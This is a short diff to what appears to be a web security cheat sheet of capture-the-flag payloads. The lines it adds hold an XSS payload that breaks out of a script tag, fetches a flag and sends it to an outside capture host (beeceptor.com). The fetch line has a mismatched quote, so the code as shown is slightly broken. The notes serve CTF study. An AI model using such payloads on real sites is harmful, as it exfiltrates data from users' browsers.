@@ -26,6 +26,14 @@ date: 2024-02-07
         <data><ID>&xxe;</ID></data>
     ```
 * XSS
+    ```javascript
+    </script><script>
+    fetch(`/getflag\)
+        .then(r=>r.text())
+        .then(flag=>location.href=`https://sbk6401.free.beeceptor.com/?f=${flag}`
+        )
+    </script>
+    ```
 * [Command Injection - feifei Cheat Sheet](https://lab.feifei.tw/practice/ci/l1.php)
 
 ### 其他
